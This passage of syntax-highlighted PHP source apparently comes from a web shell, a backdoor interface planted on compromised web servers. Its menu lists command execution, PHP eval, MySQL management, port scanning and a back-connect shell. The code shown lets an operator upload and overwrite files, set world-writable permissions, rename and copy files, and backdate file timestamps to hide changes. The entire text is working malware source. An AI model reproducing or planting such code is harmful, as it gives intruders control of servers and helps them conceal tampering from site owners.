style="color: #eeeeec;">group</span>.<span style="color: #ad7fa8; font-style: italic;">' )'</span>;<span style="color: #729fcf;">?&gt;</span><span style="color: #8ae234;">&lt;/span&gt;</span><span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_HOST'</span>];<span style="color: #729fcf;">?&gt;</span> (<span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #eeeeec; background-color: #2e3436;">gethostbyname(</span>$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SERVER_NAME'</span>]);<span style="color: #729fcf;">?&gt;</span>)<span style="color: #8ae234;">&lt;/td&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/tr&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;tr</span> <span style="color: #8ae234;">class=</span><span style="color: #ad7fa8; font-style: italic;">"alt1"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;td&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;span</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"float:right;"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">PHP</span> <span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #8ae234;">PHP_VERSION</span>;<span style="color: #729fcf;">?&gt;</span> / <span style="color: #f57900; font-weight: bold;">Safe</span> <span style="color: #f57900; font-weight: bold;">Mode</span>:<span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'safe_mode'</span>);<span style="color: #729fcf;">?&gt;</span><span style="color: #8ae234;">&lt;/span&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('logout');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Logout</span><span style="color: #8ae234;">&lt;/a&gt;</span> | 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('file');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">File</span> <span style="color: #f57900; font-weight: bold;">Manager</span><span style="color: #8ae234;">&lt;/a&gt;</span> | 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('mysqladmin');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">MYSQL</span> <span style="color: #f57900; font-weight: bold;">Manager</span><span style="color: #8ae234;">&lt;/a&gt;</span> | 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('sqlfile');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">MySQL</span> <span style="color: #f57900; font-weight: bold;">Upload</span> &amp;<span style="color: #f57900; font-weight: bold;">amp</span>; <span style="color: #f57900; font-weight: bold;">Download</span><span style="color: #8ae234;">&lt;/a&gt;</span> | 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('shell');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Execute</span> <span style="color: #f57900; font-weight: bold;">Command</span><span style="color: #8ae234;">&lt;/a&gt;</span> | 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('phpenv');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">PHP</span> <span style="color: #f57900; font-weight: bold;">Variable</span><span style="color: #8ae234;">&lt;/a&gt;</span> | 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('portscan');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Port</span> <span style="color: #f57900; font-weight: bold;">Scan</span><span style="color: #8ae234;">&lt;/a&gt;</span> | 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('secinfo');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Security</span> <span style="color: #f57900; font-weight: bold;">information</span><span style="color: #8ae234;">&lt;/a&gt;</span> | 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('eval');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Eval</span> <span style="color: #f57900; font-weight: bold;">PHP</span> <span style="color: #f57900; font-weight: bold;">Code</span><span style="color: #8ae234;">&lt;/a&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #f57900; font-weight: bold;">IS_WIN</span>) {<span style="color: #729fcf;">?&gt;</span> | <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"javascript:g('backconnect');"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Back</span> <span style="color: #f57900; font-weight: bold;">Connect</span><span style="color: #8ae234;">&lt;/a&gt;</span><span style="color: #729fcf;">&lt;?php</span> }<span style="color: #729fcf;">?&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/td&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/tr&gt;</span>
<span style="color: #8ae234;">&lt;/table&gt;</span>
<span style="color: #8ae234;">&lt;table</span> <span style="color: #8ae234;">width=</span><span style="color: #ad7fa8; font-style: italic;">"100%"</span> <span style="color: #8ae234;">border=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span> <span style="color: #8ae234;">cellpadding=</span><span style="color: #ad7fa8; font-style: italic;">"15"</span> <span style="color: #8ae234;">cellspacing=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span><span style="color: #8ae234;">&gt;&lt;tr&gt;&lt;td&gt;</span>
<span style="color: #729fcf;">&lt;?php</span>
$<span style="color: #eeeeec;">errmsg</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">m(</span>$<span style="color: #eeeeec;">errmsg</span>);

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#33719;&#21462;&#24403;&#21069;&#36335;&#24452;</span>
<span style="color: #729fcf; font-weight: bold;">if</span> (!$<span style="color: #eeeeec;">dir</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dir</span> = $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">"DOCUMENT_ROOT"</span>] ? $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">"DOCUMENT_ROOT"</span>] : <span style="color: #ad7fa8; font-style: italic;">'.'</span>;
}
$<span style="color: #eeeeec;">nowpath</span> = <span style="color: #eeeeec; background-color: #2e3436;">getPath(</span><span style="color: #f57900; font-weight: bold;">SA_ROOT</span>, $<span style="color: #eeeeec;">dir</span>);
<span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">substr(</span>$<span style="color: #eeeeec;">dir</span>, -<span style="color: #eeeeec; background-color: #2e3436;">1</span>) != <span style="color: #ad7fa8; font-style: italic;">'/'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dir</span> = $<span style="color: #eeeeec;">dir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>;
}

<span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'file'</span>) {

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#21028;&#26029;&#35835;&#20889;&#24773;&#20917;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dir_writeable</span> = @<span style="color: #eeeeec; background-color: #2e3436;">is_writable(</span>$<span style="color: #eeeeec;">nowpath</span>) ? <span style="color: #ad7fa8; font-style: italic;">'Writable'</span> : <span style="color: #ad7fa8; font-style: italic;">'Non-writable'</span>;

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#21019;&#24314;&#30446;&#24405;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">newdirname</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mkdirs</span> = $<span style="color: #eeeeec;">nowpath</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">newdirname</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">mkdirs</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Directory has already existed'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Directory created '</span>.(@<span style="color: #eeeeec; background-color: #2e3436;">mkdir(</span>$<span style="color: #eeeeec;">mkdirs</span>,<span style="color: #eeeeec; background-color: #2e3436;">0777</span>) ? <span style="color: #ad7fa8; font-style: italic;">'success'</span> : <span style="color: #ad7fa8; font-style: italic;">'failed'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">chmod(</span>$<span style="color: #eeeeec;">mkdirs</span>,<span style="color: #eeeeec; background-color: #2e3436;">0777</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#19978;&#20256;&#25991;&#20214;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">doupfile</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'File upload '</span>.(@<span style="color: #eeeeec; background-color: #2e3436;">copy(</span>$<span style="color: #8ae234;">_FILES</span>[<span style="color: #ad7fa8; font-style: italic;">'uploadfile'</span>][<span style="color: #ad7fa8; font-style: italic;">'tmp_name'</span>],$<span style="color: #eeeeec;">uploaddir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #8ae234;">_FILES</span>[<span style="color: #ad7fa8; font-style: italic;">'uploadfile'</span>][<span style="color: #ad7fa8; font-style: italic;">'name'</span>]) ? <span style="color: #ad7fa8; font-style: italic;">'success'</span> : <span style="color: #ad7fa8; font-style: italic;">'failed'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#32534;&#36753;&#25991;&#20214;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">editfilename</span> &amp;&amp; $<span style="color: #eeeeec;">filecontent</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span> = @<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">editfilename</span>,<span style="color: #ad7fa8; font-style: italic;">'w'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Save file '</span>.(@<span style="color: #eeeeec; background-color: #2e3436;">fwrite(</span>$<span style="color: #eeeeec;">fp</span>,$<span style="color: #eeeeec;">filecontent</span>) ? <span style="color: #ad7fa8; font-style: italic;">'success'</span> : <span style="color: #ad7fa8; font-style: italic;">'failed'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#32534;&#36753;&#25991;&#20214;&#23646;&#24615;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">pfile</span> &amp;&amp; $<span style="color: #eeeeec;">newperm</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">pfile</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'The original file does not exist'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">newperm</span> = <span style="color: #eeeeec; background-color: #2e3436;">base_convert(</span>$<span style="color: #eeeeec;">newperm</span>,<span style="color: #eeeeec; background-color: #2e3436;">8</span>,<span style="color: #eeeeec; background-color: #2e3436;">10</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Modify file attributes '</span>.(@<span style="color: #eeeeec; background-color: #2e3436;">chmod(</span>$<span style="color: #eeeeec;">pfile</span>,$<span style="color: #eeeeec;">newperm</span>) ? <span style="color: #ad7fa8; font-style: italic;">'success'</span> : <span style="color: #ad7fa8; font-style: italic;">'failed'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#25913;&#21517;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">oldname</span> &amp;&amp; $<span style="color: #eeeeec;">newfilename</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">nname</span> = $<span style="color: #eeeeec;">nowpath</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">newfilename</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">nname</span>) || !<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">oldname</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span>$<span style="color: #eeeeec;">nname</span>.<span style="color: #ad7fa8; font-style: italic;">' has already existed or original file does not exist'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(basename(</span>$<span style="color: #eeeeec;">oldname</span>).<span style="color: #ad7fa8; font-style: italic;">' renamed '</span>.<span style="color: #eeeeec; background-color: #2e3436;">basename(</span>$<span style="color: #eeeeec;">nname</span>).(@<span style="color: #eeeeec; background-color: #2e3436;">rename(</span>$<span style="color: #eeeeec;">oldname</span>,$<span style="color: #eeeeec;">nname</span>) ? <span style="color: #ad7fa8; font-style: italic;">' success'</span> : <span style="color: #ad7fa8; font-style: italic;">'failed'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#22797;&#21046;&#25991;&#20214;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">sname</span> &amp;&amp; $<span style="color: #eeeeec;">tofile</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">tofile</span>) || !<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">sname</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'The goal file has already existed or original file does not exist'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(basename(</span>$<span style="color: #eeeeec;">tofile</span>).<span style="color: #ad7fa8; font-style: italic;">' copied '</span>.(@<span style="color: #eeeeec; background-color: #2e3436;">copy(</span>$<span style="color: #eeeeec;">sname</span>,$<span style="color: #eeeeec;">tofile</span>) ? <span style="color: #eeeeec; background-color: #2e3436;">basename(</span>$<span style="color: #eeeeec;">tofile</span>).<span style="color: #ad7fa8; font-style: italic;">' success'</span> : <span style="color: #ad7fa8; font-style: italic;">'failed'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#20811;&#38534;&#26102;&#38388;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">curfile</span> &amp;&amp; $<span style="color: #eeeeec;">tarfile</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!@<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">curfile</span>) || !@<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">tarfile</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'The goal file has already existed or original file does not exist'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">time</span> = @<span style="color: #eeeeec; background-color: #2e3436;">filemtime(</span>$<span style="color: #eeeeec;">tarfile</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Modify file the last modified '</span>.(@<span style="color: #eeeeec; background-color: #2e3436;">touch(</span>$<span style="color: #eeeeec;">curfile</span>,$<span style="color: #eeeeec;">time</span>,$<span style="color: #eeeeec;">time</span>) ? <span style="color: #ad7fa8; font-style: italic;">'success'</span> : <span style="color: #ad7fa8; font-style: italic;">'failed'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#33258;&#23450;&#20041;&#26102;&#38388;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">curfile</span> &amp;&amp; $<span style="color: #eeeeec;">year</span> &amp;&amp; $<span style="color: #eeeeec;">month</span> &amp;&amp; $<span style="color: #eeeeec;">day</span> &amp;&amp; $<span style="color: #eeeeec;">hour</span> &amp;&amp; $<span style="color: #eeeeec;">minute</span> &amp;&amp; $<span style="color: #eeeeec;">second</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!@<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">curfile</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(basename(</span>$<span style="color: #eeeeec;">curfile</span>).<span style="color: #ad7fa8; font-style: italic;">' does not exist'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">time</span> = <span style="color: #eeeeec; background-color: #2e3436;">strtotime(</span><span style="color: #ad7fa8; font-style: italic;">"$year-$month-$day $hour:$minute:$second"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Modify file the last modified '</span>.(@<span style="color: #eeeeec; background-color: #2e3436;">touch(</span>$<span style="color: #eeeeec;">curfile</span>,$<span style="color: #eeeeec;">time</span>,$<span style="color: #eeeeec;">time</span>) ? <span style="color: #ad7fa8; font-style: italic;">'success'</span> : <span style="color: #ad7fa8; font-style: italic;">'failed'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

